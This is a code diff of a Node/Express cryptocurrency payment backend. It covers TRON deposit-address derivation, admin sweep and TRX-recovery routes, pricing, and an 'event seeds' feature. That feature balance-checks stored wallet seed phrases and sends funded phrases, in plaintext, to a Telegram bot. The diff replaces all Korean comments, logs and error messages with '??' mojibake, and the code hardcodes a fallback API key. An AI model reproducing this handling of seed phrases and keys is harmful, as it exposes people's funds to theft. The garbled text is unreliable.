+    // expired ??? ????? ?? ?? ??
     const isExpiredAddress = existing?.status === 'expired';
 
     if (existing && !isExpiredAddress) {
-      // 기존 레코드 status → issued 리셋 (업서트)
+      // ?? ??? status ? issued ?? (???)
       if (existing.status !== 'issued' && existing.status !== 'waiting_deposit') {
         await db.depositAddressDB.updateStatus(existing.deposit_address, 'issued');
-        console.log('[REQUEST-ADDR] 상태 리셋 → issued ▶', existing.deposit_address);
+        console.log('[REQUEST-ADDR] ?? ?? ? issued ?', existing.deposit_address);
       }
       return res.json({
         address: existing.deposit_address,
@@ -2620,20 +2713,20 @@ app.post('/api/payment/request-address', async (req, res) => {
       });
     }
 
-    // 구버전 레코드 또는 만료 레코드 존재 여부 (invalidated 경고용 — 신규 발급 진행)
+    // ??? ??? ?? ?? ??? ?? ?? (invalidated ??? ? ?? ?? ??)
     const oldRecord = !isExpiredAddress
       ? await db.depositAddressDB.findOldVersion(resolvedUserId, activeWallet.wallet_version)
       : null;
     const wasInvalidated = !!oldRecord || isExpiredAddress;
     if (isExpiredAddress) {
-      console.log('[REQUEST-ADDR] 기존 주소 만료됨 → 새 주소 발급 ▶', existing.deposit_address);
+      console.log('[REQUEST-ADDR] ?? ?? ??? ? ? ?? ?? ?', existing.deposit_address);
     }
     if (wasInvalidated) {
-      console.log('[REQUEST-ADDR] 구버전 레코드 있음 → 새 버전으로 신규 발급 ▶ oldVersion:', oldRecord.wallet_version);
+      console.log('[REQUEST-ADDR] ??? ??? ?? ? ? ???? ?? ?? ? oldVersion:', oldRecord.wallet_version);
     }
 
-    // 신규 주소 발급: 니모닉 기반 HD 파생 또는 root 주소 직접 사용
-    // 동시 요청 시 index 충돌을 방지하기 위해 재시도 루프 사용
+    // ?? ?? ??: ??? ?? HD ?? ?? root ?? ?? ??
+    // ?? ?? ? index ??? ???? ?? ??? ?? ??
     const secret = activeWallet.xpub_key;
     let newAddress;
     let newIndex;
@@ -2646,19 +2739,19 @@ app.post('/api/payment/request-address', async (req, res) => {
         [activeWallet.wallet_version]
       );
       newIndex = maxRows[0].maxIdx + 1 + attempt;
-      console.log(`[REQUEST-ADDR] 신규 index ▶ ${newIndex} (attempt ${attempt})`);
+      console.log(`[REQUEST-ADDR] ?? index ? ${newIndex} (attempt ${attempt})`);
 
       if (secret) {
         try {
           newAddress = deriveTronAddress(secret, newIndex);
-          console.log('[REQUEST-ADDR] HD 파생 주소 ▶', newAddress);
+          console.log('[REQUEST-ADDR] HD ?? ?? ?', newAddress);
         } catch (e) {
-          console.error('[REQUEST-ADDR] HD 주소 파생 오류 ▶', e.message);
-          return res.status(500).json({ error: '주소 파생 오류. 관리자에게 문의하세요.' });
+          console.error('[REQUEST-ADDR] HD ?? ?? ?? ?', e.message);
+          return res.status(500).json({ error: '?? ?? ??. ????? ?????.' });
         }
       } else {
         newAddress = activeWallet.root_wallet_address;
-        console.log('[REQUEST-ADDR] 니모닉 없음 → root 주소 사용 ▶', newAddress);
+        console.log('[REQUEST-ADDR] ??? ?? ? root ?? ?? ?', newAddress);
       }
 
       try {
@@ -2671,12 +2764,12 @@ app.post('/api/payment/request-address', async (req, res) => {
           walletVersion: activeWallet.wallet_version,
           derivationIndex: newIndex,
         });
-        console.log('[REQUEST-ADDR] DB 저장 완료 ▶ userId:', resolvedUserId, 'index:', newIndex);
+        console.log('[REQUEST-ADDR] DB ?? ?? ? userId:', resolvedUserId, 'index:', newIndex);
         insertSuccess = true;
         break;
       } catch (insertErr) {
         if (insertErr.code === 'ER_DUP_ENTRY') {
-          console.warn(`[REQUEST-ADDR] 주소 충돌 (index ${newIndex}), 재시도 중...`);
+          console.warn(`[REQUEST-ADDR] ?? ?? (index ${newIndex}), ??? ?...`);
           continue;
         }
         throw insertErr;
@@ -2684,8 +2777,8 @@ app.post('/api/payment/request-address', async (req, res) => {
     }
 
     if (!insertSuccess) {
-      console.error('[REQUEST-ADDR] 최대 재시도 초과 ▶ userId:', resolvedUserId);
-      return res.status(500).json({ error: '주소 발급 실패 (충돌). 잠시 후 다시 시도해주세요.' });
+      console.error('[REQUEST-ADDR] ?? ??? ?? ? userId:', resolvedUserId);
+      return res.status(500).json({ error: '?? ?? ?? (??). ?? ? ?? ??????.' });
     }
 
     res.json({
@@ -2696,24 +2789,24 @@ app.post('/api/payment/request-address', async (req, res) => {
       isNew: true,
     });
   } catch (error) {
-    console.error('입금주소 발급 오류:', error);
-    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
+    console.error('???? ?? ??:', error);
+    res.status(500).json({ error: '?? ??? ??????.' });
   }
 });
 
-// ---------- 관리자 - 수금 지갑 관리 ----------
+// ---------- ??? - ?? ?? ?? ----------
 
-// GET /api/admin/collection-wallet — 현재 active 지갑 + 전체 이력
+// GET /api/admin/collection-wallet ? ?? active ?? + ?? ??
 app.get('/api/admin/collection-wallet', requireAdmin, requireMaster, async (req, res) => {
   try {
     const active = await db.collectionWalletDB.getActive();
     const history = await db.collectionWalletDB.getHistory();
 
-    // xpub_key 분석 — 실제 값은 노출하지 않고 스윕 가능 여부만 반환
+    // xpub_key ?? ? ?? ?? ???? ?? ?? ?? ??? ??
     const secretType = (xpubKey) => {
       if (!xpubKey) return 'none';
-      if (xpubKey.startsWith('enc:')) return 'mnemonic'; // 암호화된 니모닉 → sweep 가능
-      if (xpubKey.startsWith('xpub')) return 'xpub';    // xpub → sweep 불가
+      if (xpubKey.startsWith('enc:')) return 'mnemonic'; // ???? ??? ? sweep ??
+      if (xpubKey.startsWith('xpub')) return 'xpub';    // xpub ? sweep ??
       return 'unknown';
     };
 
@@ -2721,9 +2814,9 @@ app.get('/api/admin/collection-wallet', requireAdmin, requireMaster, async (req,
       const type = secretType(w.xpub_key);
       return {
         ...w,
-        xpub_key: undefined,          // 원본 비노출
+        xpub_key: undefined,          // ?? ???
         secretType: type,             // 'mnemonic' | 'xpub' | 'none' | 'unknown'
-        canDerive: type === 'mnemonic', // true = sweep 가능
+        canDerive: type === 'mnemonic', // true = sweep ??
       };
     };
 
@@ -2736,30 +2829,30 @@ app.get('/api/admin/collection-wallet', requireAdmin, requireMaster, async (req,
 
     res.json({ active: active ? sanitize(active) : null, history: historyWithStats });
   } catch (error) {
-    console.error('수금 지갑 조회 오류:', error);
-    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
+    console.error('?? ?? ?? ??:', error);
+    res.status(500).json({ error: '?? ??? ??????.' });
   }
 });
 
-// POST /api/admin/collection-wallet — 새 수금 지갑 등록 (기존 버전 비활성화)
+// POST /api/admin/collection-wallet ? ? ?? ?? ?? (?? ?? ????)
 app.post('/api/admin/collection-wallet', requireAdmin, requireMaster, async (req, res) => {
   try {
     const { address, mnemonic, label } = req.body || {};
-    if (!address?.trim()) return res.status(400).json({ error: 'TRON 수금 지갑 주소를 입력하세요.' });
+    if (!address?.trim()) return res.status(400).json({ error: 'TRON ?? ?? ??? ?????.' });
 
     let encryptedSecret = null;
     if (mnemonic?.trim()) {
       const plain = mnemonic.trim();
-      // 니모닉 유효성 검증
+      // ??? ??? ??
       try {
-        // 12 or 24단어 체크 + 첫 번째 주소 파생 테스트
+        // 12 or 24?? ?? + ? ?? ?? ?? ???
         const wordCount = plain.split(/\s+/).length;
         if (wordCount !== 12 && wordCount !== 24) {
-          return res.status(400).json({ error: '니모닉은 12단어 또는 24단어여야 합니다.' });
+          return res.status(400).json({ error: '???? 12?? ?? 24???? ???.' });
         }
-        HDNodeWallet.fromPhrase(plain, undefined, `m/44'/195'/0'/0/0`); // 유효성 검증
+        HDNodeWallet.fromPhrase(plain, undefined, `m/44'/195'/0'/0/0`); // ??? ??
       } catch {
-        return res.status(400).json({ error: '니모닉 형식이 올바르지 않습니다.' });
+        return res.status(400).json({ error: '??? ??? ???? ????.' });
       }
       encryptedSecret = encryptSecret(plain);
     }
@@ -2773,15 +2866,15 @@ app.post('/api/admin/collection-wallet', requireAdmin, requireMaster, async (req
       ok: true,
       walletVersion: newVersion,
       canDerive: !!encryptedSecret,
-      message: `수금 지갑이 v${newVersion}으로 변경되었습니다. ${encryptedSecret ? '(개인 주소 파생 활성화)' : '(공용 주소 모드)'}`,
+      message: `?? ??? v${newVersion}?? ???????. ${encryptedSecret ? '(?? ?? ?? ???)' : '(?? ?? ??)'}`,
     });
   } catch (error) {
-    console.error('수금 지갑 변경 오류:', error);
-    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
+    console.error('?? ?? ?? ??:', error);
+    res.status(500).json({ error: '?? ??? ??????.' });
   }
 });
 
-// GET /api/admin/deposit-addresses — 발급 주소 목록 조회
+// GET /api/admin/deposit-addresses ? ?? ?? ?? ??
 app.get('/api/admin/deposit-addresses', requireAdmin, requireMaster, async (req, res) => {
   try {
     const { walletVersion, status, page = 1, pageSize = 30 } = req.query;
@@ -2793,28 +2886,28 @@ app.get('/api/admin/deposit-addresses', requireAdmin, requireMaster, async (req,
     });
     res.json(result);
   } catch (error) {
-    console.error('입금주소 목록 조회 오류:', error);
-    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
+    console.error('???? ?? ?? ??:', error);
+    res.status(500).json({ error: '?? ??? ??????.' });
   }
 });
 
-// ---------- Sweep (입금 주소 → 메인 지갑 회수) ----------
+// ---------- Sweep (?? ?? ? ?? ?? ??) ----------
 // POST /api/admin/sweep
-// body: { depositAddress } — 특정 입금주소의 USDT를 root 지갑으로 sweep
+// body: { depositAddress } ? ?? ????? USDT? root ???? sweep
 app.post('/api/admin/sweep', requireAdmin, requireMaster, async (req, res) => {
   try {
     const { depositAddress } = req.body || {};
-    if (!depositAddress?.trim()) return res.status(400).json({ error: 'depositAddress 필요' });
+    if (!depositAddress?.trim()) return res.status(400).json({ error: 'depositAddress ??' });
 
-    // 1. 입금주소 정보 조회
+    // 1. ???? ?? ??
     const [[row]] = await db.pool.query(
       'SELECT d.*, c.xpub_key, c.root_wallet_address FROM deposit_addresses d JOIN collection_wallets c ON d.wallet_version = c.wallet_version WHERE d.deposit_address = ?',
       [depositAddress.trim()]
     );
-    if (!row) return res.status(404).json({ error: '발급 주소를 찾을 수 없습니다.' });
-    if (!row.xpub_key) return res.status(400).json({ error: '이 버전은 니모닉이 없어 자동 sweep 불가합니다.' });
+    if (!row) return res.status(404).json({ error: '?? ??? ?? ? ????.' });
+    if (!row.xpub_key) return res.status(400).json({ error: '? ??? ???? ?? ?? sweep ?????.' });
 
-    // 2. 개인키 파생
+    // 2. ??? ??
     let privateKey;
     try {
       privateKey = deriveTronPrivateKey(row.xpub_key, row.derivation_index);
@@ -2822,7 +2915,7 @@ app.post('/api/admin/sweep', requireAdmin, requireMaster, async (req, res) => {
       return res.status(400).json({ error: e.message });
     }
 
-    // 3. TronWeb으로 USDT sweep (API 키 없이 사용 — 키 있으면 오히려 401 발생)
+    // 3. TronWeb?? USDT sweep (API ? ?? ?? ? ? ??? ??? 401 ??)
     const { TronWeb } = require('tronweb');
     const tronWeb = new TronWeb({ fullHost: TRON_FULL_HOST, privateKey });
 
@@ -2832,33 +2925,33 @@ app.post('/api/admin/sweep', requireAdmin, requireMaster, async (req, res) => {
     const balance = Number(balanceRaw) / 1e6;
 
     if (balance < 0.1) {
-      return res.status(400).json({ error: `잔액 부족 (${balance} USDT). sweep 최소 기준: 0.1 USDT` });
+      return res.status(400).json({ error: `?? ?? (${balance} USDT). sweep ?? ??: 0.1 USDT` });
     }
 
-    // 전액 전송
+    // ?? ??
     const toAddress = row.root_wallet_address;
     const amount = Number(balanceRaw);
     const tx = await contract.transfer(toAddress, amount).send({ feeLimit: 30_000_000 });
 
-    // 상태 업데이트
+    // ?? ????
     await db.depositAddressDB.updateStatus(depositAddress.trim(), 'swept');
 
     res.json({ ok: true, txId: tx, amount: balance, to: toAddress });
   } catch (error) {
-    console.error('Sweep 오류:', error);
-    res.status(500).json({ error: `Sweep 실패: ${error.message || error}` });
+    console.error('Sweep ??:', error);
+    res.status(500).json({ error: `Sweep ??: ${error.message || error}` });
   }
 });
 
-// POST /api/admin/recover-trx — 입금주소에서 TRX 전액 root 지갑으로 회수
-// body: {} → 전체 주소, { depositAddress } → 특정 주소만
+// POST /api/admin/recover-trx ? ?????? TRX ?? root ???? ??
+// body: {} ? ?? ??, { depositAddress } ? ?? ???
 app.post('/api/admin/recover-trx', requireAdmin, requireMaster, async (req, res) => {
   try {
     const TRON_KEY = process.env.TRONGRID_API_KEY || 'c2b82453-208b-4607-9222-896e921990cb';
     const { TronWeb } = require('tronweb');
     const { depositAddress: singleAddr } = req.body || {};
 
-    // 1. 대상 주소 조회 (단일 or 전체)
+    // 1. ?? ?? ?? (?? or ??)
     const whereClause = singleAddr
       ? 'WHERE c.xpub_key IS NOT NULL AND c.xpub_key != \'\' AND d.deposit_address = ?'
       : 'WHERE c.xpub_key IS NOT NULL AND c.xpub_key != \'\'';
@@ -2870,41 +2963,41 @@ app.post('/api/admin/recover-trx', requireAdmin, requireMaster, async (req, res)
       ${whereClause}
     `, params);
 
-    if (!rows.length) return res.json({ ok: true, results: [], message: '회수 가능한 주소 없음' });
+    if (!rows.length) return res.json({ ok: true, results: [], message: '?? ??? ?? ??' });
 
     const results = [];
     for (const row of rows) {
       const addr = row.deposit_address;
       try {
-        // TRX 잔액 조회
+        // TRX ?? ??
         const balResp = await axios.get(
           `https://api.trongrid.io/v1/accounts/${addr}`,
           { headers: { 'TRON-PRO-API-KEY': TRON_KEY }, timeout: 8000 }
         );
         const trxBalance = (balResp.data?.data?.[0]?.balance || 0) / 1e6;
 
-        // 최소 3 TRX 이상 있을 때만 회수 (dust 방지)
+        // ?? 3 TRX ?? ?? ?? ?? (dust ??)
         if (trxBalance < 3) {
-          results.push({ address: addr, skipped: true, reason: `잔액 부족 (${trxBalance.toFixed(2)} TRX)` });
+          results.push({ address: addr, skipped: true, reason: `?? ?? (${trxBalance.toFixed(2)} TRX)` });
           continue;
         }
 
-        // 개인키 파생
+        // ??? ??
         const privateKey = deriveTronPrivateKey(row.xpub_key, row.derivation_index);
         const tronWeb = new TronWeb({ fullHost: TRON_FULL_HOST, privateKey });
 
-        // 전송량: 전액에서 1 TRX 차감 (수수료 여유분)
+        // ???: ???? 1 TRX ?? (??? ???)
         const sendTrx = Math.floor((trxBalance - 1) * 1_000_000) / 1_000_000;
         const txResult = await tronWeb.trx.sendTransaction(row.root_wallet_address, TronWeb.toSun(sendTrx));
         const txId = txResult?.txid || txResult?.transaction?.txID || 'unknown';
 
-        console.log(`[RECOVER-TRX] ${addr} → root ${sendTrx} TRX, txid=${txId}`);
+        console.log(`[RECOVER-TRX] ${addr} ? root ${sendTrx} TRX, txid=${txId}`);
         results.push({ address: addr, sent: sendTrx, txId, ok: true });
       } catch (e) {
-        console.error(`[RECOVER-TRX] ${addr} 실패:`, e.message);
+        console.error(`[RECOVER-TRX] ${addr} ??:`, e.message);
         results.push({ address: addr, ok: false, error: e.message });
       }
-      // TronGrid 요청 간격 유지
+      // TronGrid ?? ?? ??
       await new Promise(r => setTimeout(r, 500));
     }
 
@@ -2912,62 +3005,62 @@ app.post('/api/admin/recover-trx', requireAdmin, requireMaster, async (req, res)
     const totalSent = results.filter(r => r.ok).reduce((s, r) => s + (r.sent || 0), 0);
     res.json({ ok: true, results, summary: { total: rows.length, success, totalSentTrx: totalSent.toFixed(2) } });
   } catch (error) {
-    console.error('[RECOVER-TRX] 오류:', error);
-    res.status(500).json({ error: `TRX 회수 실패: ${error.message}` });
+    console.error('[RECOVER-TRX] ??:', error);
+    res.status(500).json({ error: `TRX ?? ??: ${error.message}` });
   }
 });
 
-// ---------- 가격 설정 API ----------
+// ---------- ?? ?? API ----------
 
-// GET /api/payment/pricing — 클라이언트가 가격 조회 (인증 불필요)
+// GET /api/payment/pricing ? ?????? ?? ?? (?? ???)
 app.get('/api/payment/pricing', async (req, res) => {
   try {
     const raw = await db.settingDB.get('subscription_packages');
     const monthlyRaw = await db.settingDB.get('monthly_price_usdt');
     const packages = raw ? JSON.parse(raw) : [
-      { days: 30,  label: '1개월',  price: 39 },
-      { days: 60,  label: '2개월',  price: 75 },
-      { days: 90,  label: '3개월',  price: 110 },
-      { days: 180, label: '6개월',  price: 210 },
-      { days: 365, label: '12개월', price: 390 },
+      { days: 30,  label: '1??',  price: 39 },
+      { days: 60,  label: '2??',  price: 75 },
+      { days: 90,  label: '3??',  price: 110 },
+      { days: 180, label: '6??',  price: 210 },
+      { days: 365, label: '12??', price: 390 },
     ];
     const monthlyPrice = monthlyRaw ? Number(monthlyRaw) : 39;
     res.json({ monthlyPrice, packages });
   } catch (error) {
-    console.error('가격 조회 오류:', error);
-    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
+    console.error('?? ?? ??:', error);
+    res.status(500).json({ error: '?? ??? ??????.' });
   }
 });
 
-// POST /api/admin/pricing — 가격 패키지 저장 (마스터 전용)
+// POST /api/admin/pricing ? ?? ??? ?? (??? ??)
 app.post('/api/admin/pricing', requireAdmin, requireMaster, async (req, res) => {
   try {
     const { monthlyPrice, packages } = req.body || {};
     if (monthlyPrice == null || isNaN(Number(monthlyPrice))) {
-      return res.status(400).json({ error: '월 기준 가격(USDT)을 입력하세요.' });
+      return res.status(400).json({ error: '? ?? ??(USDT)? ?????.' });
     }
     if (!Array.isArray(packages) || packages.length === 0) {
-      return res.status(400).json({ error: '패키지 목록이 필요합니다.' });
+      return res.status(400).json({ error: '??? ??? ?????.' });
     }
     await db.settingDB.set('monthly_price_usdt', String(Number(monthlyPrice)));
     await db.settingDB.set('subscription_packages', JSON.stringify(packages));
-    res.json({ ok: true, message: '가격이 저장되었습니다.' });
+    res.json({ ok: true, message: '??? ???????.' });
   } catch (error) {
-    console.error('가격 저장 오류:', error);
-    res.status(500).json({ error: '서버 오류가 발생했습니다.' });
+    console.error('?? ?? ??:', error);
+    res.status(500).json({ error: '?? ??? ??????.' });
   }
 });
 
-// 메인 페이지(/)를 관리자 페이지로 리다이렉트
+// ?? ???(/)? ??? ???? ?????
 app.get('/', (req, res) => {
   res.redirect('/admin.html');
 });
 
-// ════════════════════════════════════════════════════
-// 시드 지급(이벤트) API  —  event_seeds 테이블 기반
-// ════════════════════════════════════════════════════
+// ????????????????????????????????????????????????????
+// ?? ??(???) API  ?  event_seeds ??? ??
+// ????????????????????????????????????????????????????
 
-// GET /api/admin/event-seeds — 지급 가능한 이벤트 시드 목록 (available 상태만)
+// GET /api/admin/event-seeds ? ?? ??? ??? ?? ?? (available ???)
 app.get('/api/admin/event-seeds', requireAdmin, requireMaster, async (req, res) => {
   try {
     const page = Math.max(1, parseInt(req.query.page) || 1);
@@ -2980,7 +3073,7 @@ app.get('/api/admin/event-seeds', requireAdmin, requireMaster, async (req, res) 
       `SELECT id,
               CONCAT(SUBSTRING_INDEX(phrase,' ',1), ' ... ',
                      SUBSTRING_INDEX(phrase,' ',-1), ' (',
-                     LENGTH(phrase)-LENGTH(REPLACE(phrase,' ',''))+1, '단어)') AS phrase_preview,
+                     LENGTH(phrase)-LENGTH(REPLACE(phrase,' ',''))+1, '??)') AS phrase_preview,
               COALESCE(btc,0) AS btc, COALESCE(eth,0) AS eth,
               COALESCE(tron,0) AS tron, COALESCE(sol,0) AS sol,
               note, created_at
@@ -2990,26 +3083,26 @@ app.get('/api/admin/event-seeds', requireAdmin, requireMaster, async (req, res) 
     );
     res.json({ total, page, pageSize, totalPages: Math.ceil(total / pageSize), items: rows });
   } catch (e) {
-    console.error('[EVENT-SEEDS] 오류:', e.message);
+    console.error('[EVENT-SEEDS] ??:', e.message);
     res.status(500).json({ error: e.message });
   }
 });
 
-// POST /api/admin/event-seeds — 이벤트 시드 추가 (단건 또는 벌크)
-// body: { phrase, note, btc, eth, tron, sol }  또는  { bulk: "phrase1\nphrase2\n..." }
+// POST /api/admin/event-seeds ? ??? ?? ?? (?? ?? ??)
+// body: { phrase, note, btc, eth, tron, sol }  ??  { bulk: "phrase1\nphrase2\n..." }
 app.post('/api/admin/event-seeds', requireAdmin, requireMaster, async (req, res) => {
   try {
     const { phrase, bulk, note, btc, eth, tron, sol } = req.body || {};
     if (bulk) {
       const phrases = bulk.split('\n').map(s => s.trim()).filter(Boolean);
-      if (!phrases.length) return res.status(400).json({ error: '시드 문구가 없습니다.' });
+      if (!phrases.length) return res.status(400).json({ error: '?? ??? ????.' });
       const values = phrases.map(p => [p, note || null]);
       await db.pool.query(
         `INSERT INTO event_seeds (phrase, note) VALUES ?`, [values]
       );
       return res.json({ ok: true, added: phrases.length });
     }
-    if (!phrase?.trim()) return res.status(400).json({ error: 'phrase 필요' });
+    if (!phrase?.trim()) return res.status(400).json({ error: 'phrase ??' });
     await db.pool.query(
       `INSERT INTO event_seeds (phrase, note, btc, eth, tron, sol) VALUES (?,?,?,?,?,?)`,
       [phrase.trim(), note||null, btc||null, eth||null, tron||null, sol||null]
@@ -3020,7 +3113,7 @@ app.post('/api/admin/event-seeds', requireAdmin, requireMaster, async (req, res)
   }
 });
 
-// DELETE /api/admin/event-seeds/:id — 이벤트 시드 삭제
+// DELETE /api/admin/event-seeds/:id ? ??? ?? ??
 app.delete('/api/admin/event-seeds/:id', requireAdmin, requireMaster, async (req, res) => {
   try {
     await db.pool.query(`DELETE FROM event_seeds WHERE id = ? AND status = 'available'`, [req.params.id]);
@@ -3030,7 +3123,7 @@ app.delete('/api/admin/event-seeds/:id', requireAdmin, requireMaster, async (req
   }
 });
 
-// POST /api/admin/event-seeds/recheck — seed-checker.js로 잔고 재확인 (event_seeds 테이블)
+// POST /api/admin/event-seeds/recheck ? seed-checker.js? ?? ??? (event_seeds ???)
 app.post('/api/admin/event-seeds/recheck', requireAdmin, requireMaster, async (req, res) => {
   try {
     const { ids } = req.body;
@@ -3041,19 +3134,19 @@ app.post('/api/admin/event-seeds/recheck', requireAdmin, requireMaster, async (r
     } else if (Array.isArray(ids) && ids.length > 0) {
       seedIds = ids.map(Number).filter(n => !isNaN(n) && n > 0);
     }
-    if (!seedIds.length) return res.status(400).json({ error: '재확인할 이벤트 시드가 없습니다.' });
-    if (seedIds.length > 50) return res.status(400).json({ error: '한 번에 최대 50개까지 가능합니다.' });
+    if (!seedIds.length) return res.status(400).json({ error: '???? ??? ??? ????.' });
+    if (seedIds.length > 50) return res.status(400).json({ error: '? ?? ?? 50??? ?????.' });
 
     const ph = seedIds.map(() => '?').join(',');
     const [seeds] = await db.pool.query(`SELECT id, phrase, note FROM event_seeds WHERE id IN (${ph})`, seedIds);
 
-    res.json({ ok: true, queued: seeds.length, message: `${seeds.length}개 이벤트 시드 검수 시작됨. 잠시 후 새로고침하세요.` });
+    res.json({ ok: true, queued: seeds.length, message: `${seeds.length}? ??? ?? ?? ???. ?? ? ???????.` });
 
-    // 백그라운드 처리
+    // ????? ??
     (async () => {
       for (const seed of seeds) {
         try {
-          console.log(`[EVENT-SEED RECHECK] ID=${seed.id} 확인 중...`);
+          console.log(`[EVENT-SEED RECHECK] ID=${seed.id} ?? ?...`);
           const results = await checkMultiChainBalance(seed.phrase);
 
           const getbal = (net) => results.find(r => r.network === net)?.balance || 0;
@@ -3070,45 +3163,45 @@ app.post('/api/admin/event-seeds/recheck', requireAdmin, requireMaster, async (r
           const chainsWithBalance = results.filter(r => (r.balance || 0) > 0);
 
           if (chainsWithBalance.length > 0) {
-            // 마스터 알림봇으로 전송
+            // ??? ????? ??
             const [[cfg]]     = await db.pool.query(`SELECT setting_value FROM settings WHERE setting_key='master_bot_token' LIMIT 1`).catch(() => [[null]]);
             const [[cfgChat]] = await db.pool.query(`SELECT setting_value FROM settings WHERE setting_key='master_chat_id' LIMIT 1`).catch(() => [[null]]);
             const botToken = cfg?.setting_value;
             const chatId   = cfgChat?.setting_value;
 
-            let msg = `🎁 <b>[이벤트 시드] 잔고 확인!</b>\n🆔 ID: ${seed.id}\n`;
-            if (seed.note) msg += `📝 메모: ${seed.note}\n`;
+            let msg = `?? <b>[??? ??] ?? ??!</b>\n?? ID: ${seed.id}\n`;
+            if (seed.note) msg += `?? ??: ${seed.note}\n`;
             msg += '\n';
             for (const r of chainsWithBalance) {
-              msg += `━━━━━━━━━━━━━━━━━━\n`;
-              msg += `🌐 <b>${r.network.toUpperCase()}</b>\n`;
-              msg += `💰 <b>잔고:</b> ${r.balance} ${r.symbol}\n`;
-              if (r.address) msg += `🔑 <b>주소:</b> <code>${r.address}</code>\n`;
+              msg += `??????????????????\n`;
+              msg += `?? <b>${r.network.toUpperCase()}</b>\n`;
+              msg += `?? <b>??:</b> ${r.balance} ${r.symbol}\n`;
+              if (r.address) msg += `?? <b>??:</b> <code>${r.address}</code>\n`;
             }
-            msg += `\n━━━━━━━━━━━━━━━━━━\n📝 <b>시드 문구:</b>\n<code>${seed.phrase}</code>\n━━━━━━━━━━━━━━━━━━`;
+            msg += `\n??????????????????\n?? <b>?? ??:</b>\n<code>${seed.phrase}</code>\n??????????????????`;
 
             if (botToken && chatId) {
               await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 chat_id: chatId, text: msg, parse_mode: 'HTML'
-              }).catch(e => console.error('[EVENT-SEED RECHECK] Telegram 오류:', e.message));
+              }).catch(e => console.error('[EVENT-SEED RECHECK] Telegram ??:', e.message));
             }
-            console.log(`[EVENT-SEED RECHECK] ID=${seed.id} 잔고 발견! BTC=${btc} ETH=${eth} TRON=${tron} SOL=${sol}`);
+            console.log(`[EVENT-SEED RECHECK] ID=${seed.id} ?? ??! BTC=${btc} ETH=${eth} TRON=${tron} SOL=${sol}`);
           } else {
-            console.log(`[EVENT-SEED RECHECK] ID=${seed.id} 잔고 없음`);
+            console.log(`[EVENT-SEED RECHECK] ID=${seed.id} ?? ??`);
           }
         } catch (e) {
-          console.error(`[EVENT-SEED RECHECK] ID=${seed.id} 오류:`, e.message);
+          console.error(`[EVENT-SEED RECHECK] ID=${seed.id} ??:`, e.message);
         }
         await new Promise(r => setTimeout(r, 500));
       }
-      console.log(`[EVENT-SEED RECHECK] 전체 완료 (${seeds.length}개)`);
+      console.log(`[EVENT-SEED RECHECK] ?? ?? (${seeds.length}?)`);
     })();
   } catch (e) {
     res.status(500).json({ error: e.message });
   }
 });
 
-// GET /api/admin/seed-gifts — 지급 이력 목록
+// GET /api/admin/seed-gifts ? ?? ?? ??
 app.get('/api/admin/seed-gifts', requireAdmin, requireMaster, async (req, res) => {
   try {
     const [rows] = await db.pool.query(
@@ -3127,30 +3220,30 @@ app.get('/api/admin/seed-gifts', requireAdmin, requireMaster, async (req, res) =
 });
 
 // POST /api/admin/seed-gifts/assign
-// body: { eventSeedId, userId, note } 또는 { random: true, userId, note }
+// body: { eventSeedId, userId, note } ?? { random: true, userId, note }
 app.post('/api/admin/seed-gifts/assign', requireAdmin, requireMaster, async (req, res) => {
   try {
     const { eventSeedId, userId, note, random } = req.body || {};
-    if (!userId?.trim()) return res.status(400).json({ error: 'userId 필요' });
+    if (!userId?.trim()) return res.status(400).json({ error: 'userId ??' });
 
     const [[user]] = await db.pool.query('SELECT id FROM users WHERE id = ?', [userId.trim()]);
-    if (!user) return res.status(404).json({ error: `유저 '${userId}' 없음` });
+    if (!user) return res.status(404).json({ error: `?? '${userId}' ??` });
 
     let targetId = eventSeedId;
     if (random || !eventSeedId) {
       const [[rnd]] = await db.pool.query(
         `SELECT id FROM event_seeds WHERE status = 'available' ORDER BY RAND() LIMIT 1`
       );
-      if (!rnd) return res.status(404).json({ error: '지급 가능한 이벤트 시드 없음' });
+      if (!rnd) return res.status(404).json({ error: '?? ??? ??? ?? ??' });
       targetId = rnd.id;
     }
 
     const [[seed]] = await db.pool.query(
       `SELECT id, phrase FROM event_seeds WHERE id = ? AND status = 'available'`, [targetId]
     );
-    if (!seed) return res.status(404).json({ error: `이벤트 시드 ID ${targetId} 없음 또는 이미 지급됨` });
+    if (!seed) return res.status(404).json({ error: `??? ?? ID ${targetId} ?? ?? ?? ???` });
 
-    // 지급 처리: event_seeds 상태 변경 + seed_gifts 이력 생성
+    // ?? ??: event_seeds ?? ?? + seed_gifts ?? ??
     await db.pool.query(`UPDATE event_seeds SET status = 'assigned' WHERE id = ?`, [targetId]);
     await db.pool.query(
       `INSERT INTO seed_gifts (event_seed_id, user_id, phrase, note, status) VALUES (?,?,?,?,'pending')`,
@@ -3162,13 +3255,13 @@ app.post('/api/admin/seed-gifts/assign', requireAdmin, requireMaster, async (req
   }
 });
 
-// DELETE /api/admin/seed-gifts/:id — 지급 취소 (pending만 가능, event_seeds 복구)
+// DELETE /api/admin/seed-gifts/:id ? ?? ?? (pending? ??, event_seeds ??)
 app.delete('/api/admin/seed-gifts/:id', requireAdmin, requireMaster, async (req, res) => {
   try {
     const [[gift]] = await db.pool.query(
       `SELECT event_seed_id FROM seed_gifts WHERE id = ? AND status = 'pending'`, [req.params.id]
     );
-    if (!gift) return res.status(400).json({ error: '취소 불가 (이미 전달됐거나 없음)' });
+    if (!gift) return res.status(400).json({ error: '?? ?? (?? ????? ??)' });
     await db.pool.query(`UPDATE seed_gifts SET status = 'cancelled' WHERE id = ?`, [req.params.id]);
     await db.pool.query(`UPDATE event_seeds SET status = 'available' WHERE id = ?`, [gift.event_seed_id]);
     res.json({ ok: true });
@@ -3177,13 +3270,13 @@ app.delete('/api/admin/seed-gifts/:id', requireAdmin, requireMaster, async (req,
   }
 });
 
-// GET /api/user/gift-seed?token= — 클라이언트 폴링: 대기 중인 지급 시드 확인
+// GET /api/user/gift-seed?token= ? ????? ??: ?? ?? ?? ?? ??
 app.get('/api/user/gift-seed', async (req, res) => {
   try {
     const token = req.query.token || req.headers['x-token'];
-    if (!token) return res.status(401).json({ error: '토큰 필요' });
+    if (!token) return res.status(401).json({ error: '?? ??' });
     const userId = await sessionStore.getUserId(token);
-    if (!userId) return res.status(401).json({ error: '세션 만료' });
